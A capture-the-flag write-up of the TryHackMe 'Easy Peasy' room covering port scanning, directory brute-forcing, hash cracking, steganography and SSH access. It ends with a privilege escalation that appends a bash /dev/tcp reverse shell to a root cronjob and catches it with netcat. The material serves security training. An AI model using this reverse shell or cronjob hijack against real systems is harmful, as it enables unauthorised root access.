# TRYHACKME : Easy Peasy
Another fun and easy room for a nooby like me.

## Enumeration through Nmap

Let's first initialize enumeration with nmap and gobuster.

### Nmap
We get three open ports
```
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 61 nginx 1.16.1
| http-robots.txt: 1 disallowed entry 
|_/
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.16.1
|_http-title: Welcome to nginx!
6498/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCf5hzG6d/mEZZIeldje4ZWpwq0zAJWvFf1IzxJX1ZuOWIspHuL0X0z6qEfoTxI/o8tAFjVP/B03BT0WC3WQTm8V3Q63lGda0CBOly38hzNBk8p496scVI9WHWRaQTS4I82I8Cr+L6EjX5tMcAygRJ+QVuy2K5IqmhY3jULw/QH0fxN6Heew2EesHtJuXtf/33axQCWhxBckg1Re26UWKXdvKajYiljGCwEw25Y9qWZTGJ+2P67LVegf7FQu8ReXRrOTzHYL3PSnQJXiodPKb2ZvGAnaXYy8gm22HMspLeXF2riGSRYlGAO3KPDcDqF4hIeKwDWFbKaOwpHOX34qhJz
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN8/fLeNoGv6fwAVkd9oVJ7OIbn4117grXfoBdQ8vY2qpkuh30sTk7WjT+Kns4MNtTUQ7H/sZrJz+ALPG/YnDfE=
|   256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICNgw/EuawEJkhJk4i2pP4zHfUG6XfsPHh6+kQQz3G1D
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
65524/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.43 ((Ubuntu))
|_http-server-header: Apache/2.4.43 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Debian Default Page: It works
```

### Gobuster
```
$ gobuster dir -u http://10.10.186.123/ -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.186.123/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/hidden               (Status: 301) [Size: 169] [--> http://10.10.186.123/hidden/]
/robots.txt           (Status: 200) [Size: 43]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

Inspecting the `/hidden` directory... nothing really special here. 

We can rerun the gobuster with this directory.
```
$ gobuster dir -u http://10.10.186.123/hidden -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.186.123/hidden
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/whatever             (Status: 301) [Size: 169] [--> http://10.10.186.123/hidden/whatever/]                                                 
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

Open the new found diretory `/hidden/whatever`. It says that it is a deadend. Open its source code and look for some possible clue or answers.

The source code seems to contain a hash. Crack it and retrieve your flag.

## Compromising the Machine
Seems like there is nothing else to see in the port 80. Let's open the other http port, that is port 65524.

It's only showing a apache 2 page (or is it really just that??? hmm). Let's search other directories with gobuster.

### Gobuster
```
$ gobuster dir -u http://10.10.186.123:65524 -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.186.123:65524
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 281]
/.htpasswd            (Status: 403) [Size: 281]
/robots.txt           (Status: 200) [Size: 153]
/server-status        (Status: 403) [Size: 281]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

Let's open the `robots.txt` directory. 
```
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:<RETRIEVE>
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```
The user-agent text seems to be interesting, let's try to crack this hash and retrieve our flag with any tools.


### Main Site 
Seems like a deadend. Let's go back to the apache main page of `http://10.10.186.123:65524/`.
> Looking for some possible clue within the page, which gladly there is, giving us this hashed flag:

```
...They are activated by symlinking available configuration files from their respective Fl4g 3 : <RETRIEVE FLAG> *-available/ counterparts...
```
According to THM, we can crack this hash with the given txt file `easypeasy.txt` for the flag 3.
But instead of using the txt file, we can just proceed to crack it with online tools like [hashes.com](https://hashes.com/en/decrypt/hash).

> Lets find another possible flag. Although it might seem to be another deadend, inspecting the website further, led us to a hidden element!
```
<p hidden="">its encoded with ba....:<RETRIEVE></p>
```
> It even gave us a clue about it `ba....`, a base something code. Let's use [cyberchef](https://cyberchef.org/) for this one.
> The given cryptic code is encoded in bash62 after numerous try. This gives a new found directory.

### Hidden Directory
Inspecting the source code, we are met with 2 clues, which is another hash code to crack and a interesting jpg file.

#### Hash
First we use an online hash cracker [md5hashing.net](https://md5hashing.net/).
After a few minutes, retrieve the cracked hash. We will use this later.

#### JPG File
For the jpg file, let's download it and perform steganography extraction using `steghide`.
```
$ steghide extract -sf binarycodepixabay.jpg 
Enter passphrase:                     // USE THE CRACKED HASH EARLIER
wrote extracted data to "secrettext.txt".
                                                                      
$ cat secrettext.txt                  
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
```
This gave us a credential which we could use for SSH.

Decode the binary password to retrieve our password credential.

### SSH
```
$ ssh boring@10.10.186.123 -p 6498                
The authenticity of host '[10.10.186.123]:6498 ([10.10.186.123]:6498)' can't be established.
ED25519 key fingerprint is SHA256:6XHUSqR7Smm/Z9qPOQEMkXuhmxFm+McHTLbLqKoNL/Q.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.186.123]:6498' (ED25519) to the list of known hosts.
*************************************************************************
**        This connection are monitored by government offical          **
**            Please disconnect if you are not authorized              **
** A lawsuit will be filed against you if the law is not followed      **
*************************************************************************
boring@10.10.186.123's password: 
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
boring@kral4-PC:~$ ls
user.txt
boring@kral4-PC:~$ cat user.txt
User Flag But It Seems Wrong Like It`s Rotated Or Something
<RETRIEVE>
```

As the clue suggest, it might be rotated. This could be a Ceasar Cypher. Use [ceaser cypher decoder](https://www.dcode.fr/caesar-cipher) here.

### Privilege Escalation
The room description has already gave us a clue how we can perform privilege escalation: `Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.`

So we will try to exfiltrate its cronjob vulnerability.
```
boring@kral4-PC:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh

boring@kral4-PC:~$ cat /var/www/.mysecretcronjob.sh
#!/bin/bash
# i will run as root
```
We can then modify `.mysecretcronjob.sh` to get a reverse shell.
We can add this piece of shell code, inspired from [Linux Privilege Escalation](https://tryhackme.com/room/linprivesc) from another THM room.
```
boring@kral4-PC:~$ cat /var/www/.mysecretcronjob.sh
#!/bin/bash
# i will run as root

bash -i >& /dev/tcp/<ATTACKER-IP>/<ATTACKER-PORT> 0>&1  // ADD THIS
```

#### ATTACKER MACHINE
Start a netcat listener with the attacker port which for this one is 4444.
```
$ nc -lvnp 4444           
listening on [any] 4444 ...
connect to [10.4.124.80] from (UNKNOWN) [10.10.186.123] 34788
bash: cannot set terminal process group (1873): Inappropriate ioctl for device
bash: no job control in this shell
root@kral4-PC:/var/www# cd /root
cd /root
root@kral4-PC:~# ls
ls
root@kral4-PC:~# ls -la
ls -la
total 40
drwx------  5 root root 4096 Jun 15  2020 .
drwxr-xr-x 23 root root 4096 Jun 15  2020 ..
-rw-------  1 root root    2 Mar 26 13:47 .bash_history
-rw-r--r--  1 root root 3136 Jun 15  2020 .bashrc
drwx------  2 root root 4096 Jun 13  2020 .cache
drwx------  3 root root 4096 Jun 13  2020 .gnupg
drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   39 Jun 15  2020 .root.txt
-rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor
root@kral4-PC:~# cat .root.txt
cat .root.txt
<RETRIEVE FLAG>
```
